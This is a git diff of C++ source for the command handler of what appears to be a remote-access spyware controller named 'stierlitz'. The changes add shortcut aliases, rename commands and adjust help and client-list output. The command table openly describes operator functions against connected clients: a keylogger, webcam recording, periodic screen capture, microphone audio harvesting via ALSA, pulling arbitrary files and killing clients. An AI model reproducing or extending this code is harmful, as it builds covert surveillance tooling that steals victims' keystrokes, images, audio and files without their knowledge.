@@ -41,12 +41,14 @@ Argument::Argument(int __arg_num, int __arg_value_type, const std::string& __arg
 }
 
 Command::Command(
+    const std::string& __shortcut,
     const std::string& __description,
     void (CommandHandler::*__p_command_func)(), // Correct type for member function pointer
     CommandHandler* __p_command_handler,
     std::initializer_list<int> __optional,
     std::initializer_list<int> __required
 ) {
+    shortcut_ = __shortcut;
     description_ = __description;
     p_command_func_ = __p_command_func;
     p_command_handler_ = __p_command_handler;
@@ -90,12 +92,14 @@ CommandHandler::CommandHandler(
     argument_list_.push_back(Argument(HW_OUT_ARG, ARG_TYPE_STRING, "-hwo", "--hardware-output"));
 
     command_map_.emplace("help", Command(
+        "help",
         "Show this help message.\n\tFor specific command <command> -h/--help", 
         &CommandHandler::help,
         this,
         {HELP_ARG}
     ));
     command_map_.emplace("test", Command(
+        "test",
         "Test command. For specific command help <command> or <command> -h/--help",
         &CommandHandler::test,
         this,
@@ -103,12 +107,14 @@ CommandHandler::CommandHandler(
         {INDEX_ARG, ALL_ARG}
     ));
     command_map_.emplace("list", Command(
+        "ls",
         "List all clients",
         &CommandHandler::list,
         this,
         {HELP_ARG}
     ));
     command_map_.emplace("set-verb", Command(
+        "sv",
         "Set verbosity level.\n\tset-verb -v <verbosity>",
         &CommandHandler::set_verbosity,
         this,
@@ -116,12 +122,14 @@ CommandHandler::CommandHandler(
         {VERBOSITY_ARG}
     ));
     command_map_.emplace("show-verb", Command(
+        "shw",
         "Show current verbosity level and list of available verbosity levels",
         &CommandHandler::show_verbosity,
         this,
         {HELP_ARG}
     ));
     command_map_.emplace("kill", Command(
+        "k",
         "Kill the selected client. Usage:\n\tkill -i <client_index>\n\tkill -a to kill all clients",
         &CommandHandler::kill,
         this,
@@ -129,13 +137,15 @@ CommandHandler::CommandHandler(
         {INDEX_ARG, ALL_ARG}
     ));
     command_map_.emplace("get-file", Command(
-       "Get a file from the client. Usage:\n\tget-file -i <client_index> -f <file_name>. Use -o <output_file_name> to save the file",
+        "get",
+        "Get a file from the client. Usage:\n\tget-file -i <client_index> -f <file_name>. Use -o <output_file_name> to save the file",
         &CommandHandler::get_file,
         this,
         {HELP_ARG},
         {INDEX_ARG, FILE_NAME_ARG, OUT_ARG}
     ));
     command_map_.emplace("get-dev", Command( // basically get-file -f /proc/bus/input/devices
+        "getd",
         "Get the contents of /proc/bus/input/devices from a client and save it. Usage: get-dev -i <client_index>. Use -o <output_file_name> to save the file",
         &CommandHandler::get_dev,
         this,
@@ -143,13 +153,15 @@ CommandHandler::CommandHandler(
         {INDEX_ARG, OUT_ARG}
     ));
     command_map_.emplace("keylogger", Command(
+        "kyl",
         "Start listening the key logs of the selected client. Usage:\n\tkeylogger -i <client_index> -d <device number for eventX>\n\tBy default \"us\" layout is used. To change it specify it with -l/--layout argument. eg -l us \n\tUse -rm to remove the keylogger from the client",
         &CommandHandler::keylogger,
         this,
         {HELP_ARG, REMOVE_ARG, DEVICE_ARG, KB_LAYOUT_ARG},
         {INDEX_ARG}
     ));
-    command_map_.emplace("webcam", Command(
+    command_map_.emplace("webcam-recorder", Command(
+        "wr",
         "Start capturing target's webcam. Usage: \n\twebcam -i <client_index>. \n\t-d <device number for /dev/videoX> (default = 0),  \n\t-o <output_file> (if not given, captured data will not be saved)\n\twebcam -c -f <.mjpeg> -o <.avi> will convert the file into watchable format\n\t-rm to remove the keylogger from the client",
         &CommandHandler::webcam_recorder,
         this,
@@ -157,13 +169,15 @@ CommandHandler::CommandHandler(
         {}
     ));
     command_map_.emplace("screen-hunter", Command(
-        "Start the screen hunter terminal which will capture the screen frames in specific time intervals. Usage:\n\t screen-hunter -i <client_index>.\n\t-f <frames per second>. By default 0.2 (capture every 5 seconds)\n\tscreen-hunter -rm -i <client_index> to stop the tunnel",
+        "sh",
+        "Start the screen hunter terminal which will capture the screen frames in specific time intervals. Usage:\n\t screen-hunter -i <client_index>.\n\t-fps <frames per second>. By default 0.2 (capture every 5 seconds)\n\tscreen-hunter -rm -i <client_index> to stop the tunnel",
         &CommandHandler::screen_hunter,
         this,
         {HELP_ARG, REMOVE_ARG, FPS_ARG},
         {INDEX_ARG}
     ));
-    command_map_.emplace("a", Command(
+    command_map_.emplace("alsa-harvester", Command(
+        "ah",
         "Start capturing audio from the target. You can run [aplay/arecord] -l to see available device. Default input and output device: hw:0,0\n\t-hwi <target_input_device>\n\t-hwo <local_output_device>\n\t-o <output.raw> If you want to save to the output\n\t-rm -i <client_index> to stop capturing",
         &CommandHandler::alsa_harvester,
         this,
@@ -257,7 +271,6 @@ int CommandHandler::parse_arguments(const std::string& __root_cmd, const std::st
     std::find(command.required_.begin(), command.required_.end(), ALL_ARG) != command.required_.end()) {
         bool index_found = temp_arg_map.find(INDEX_ARG) != temp_arg_map.end();
         bool all_found = temp_arg_map.find(ALL_ARG) != temp_arg_map.end();
-        *p_event_log_ << LOG_MUST << RED << index_found << RESET_C2_FIFO;
 
         if (index_found && all_found) {
             *p_event_log_ << LOG_MUST << RED << "Cannot use both -i and -a arguments at the same time" << RESET_C2_FIFO;
@@ -418,9 +431,9 @@ int CommandHandler::local_execute(const char* __argv[]) {
 }
 
 void CommandHandler::help() {
-    *p_event_log_ << LOG_MUST << CYAN << "\nstierlitz Available commands\n";
+    *p_event_log_ << LOG_MUST << CYAN << "\nstierlitz Available commands\n\n";
     for (const auto& [cmd, command] : command_map_) {
-        *p_event_log_ << LOG_MUST << CYAN << cmd << "   " << command.description_ << "\n";
+        *p_event_log_ << LOG_MUST << CYAN << cmd << " / " << command.shortcut_ << " --> " << command.description_ << "\n\n";
     }
     *p_event_log_ << RESET_C2_FIFO;
 }
@@ -438,7 +451,7 @@ void CommandHandler::list() {
     *p_event_log_ << LOG_MUST << CYAN << "[Available Clients]";
     for (int i=0; i<p_clients_->size(); i++) {
         if (p_clients_->at(i) != nullptr) {
-            *p_event_log_ << "\n\n==Client " << i << "==    " << p_clients_->at(i)->ip();
+            *p_event_log_ << CYAN << "\n\n==Client " << i << "==    " << p_clients_->at(i)->ip();
             *p_event_log_ << "\nStatus: ";
             if (ClientHandler::is_client_up(p_clients_->at(i)->socket()) == 0) {
                 *p_event_log_ << GREEN << "UP\033[0m";
@@ -447,7 +460,7 @@ void CommandHandler::list() {
             }
             *p_event_log_ << CYAN << "\nTunnels:";
             if (p_tunnels_->empty()) {
-                *p_event_log_ << RED << " None";
+                *p_event_log_ << RED << " None\033[0m";
             } else {
                 for (auto it=p_tunnels_->begin(); it != p_tunnels_->end(); it++) {
                     if ((*it)->client_index_ == i) {
@@ -850,6 +863,14 @@ void CommandHandler::execute_command(char* __cmd, int __len) {
 
     cmd_ = std::string(__cmd, __len);
     std::string root_cmd = cmd_.substr(0, cmd_.find(' '));
+
+    // Check if shortcut
+    for (const auto& [key, command] : command_map_) {
+        if (root_cmd == command.shortcut_) {
+            root_cmd = key;
+            break;
+        }
+    }
 
     rc = parse_command(root_cmd);
     if (rc < 0) {
